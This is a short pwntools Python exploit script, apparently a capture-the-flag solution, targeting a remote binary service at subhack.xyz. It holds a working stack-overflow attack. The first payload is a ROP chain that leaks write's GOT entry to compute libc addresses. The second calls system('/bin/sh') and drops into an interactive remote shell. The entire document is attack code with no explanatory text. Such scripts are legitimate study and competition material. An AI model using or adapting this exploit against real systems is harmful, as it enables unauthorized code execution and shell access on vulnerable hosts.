from pwn import *
r=remote("subhack.xyz" ,1004)
p6=0x000000000040062a
call=0x0000000000400610
context.log_level='debug'
#r=process("./rop")
e=ELF("./rop")
pay=b'x'*0x48
pay+=p64(p6)
pay+=p64(0)
pay+=p64(1)
pay+=p64(e.got['write'])
pay+=p64(8)
pay+=p64(e.got['write'])
pay+=p64(1)
pay+=p64(call)
pay+=p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)
pay+=p64(e.symbols['main'])
r.sendline(pay)
data=r.recvuntil("\x7f")
data=u64(data[len(data)-6:].ljust(8,b'\x00'))-0x0f7370
log.info(hex(data))
system=data+0x453a0
binsh=data+0x18ce17

pay2=b'x'*0x48
pay2+=p64(0x400633)
pay2+=p64(binsh)
pay2+=p64(0x400633+1)
pay2+=p64(system)
r.sendline(pay2)
r.interactive()
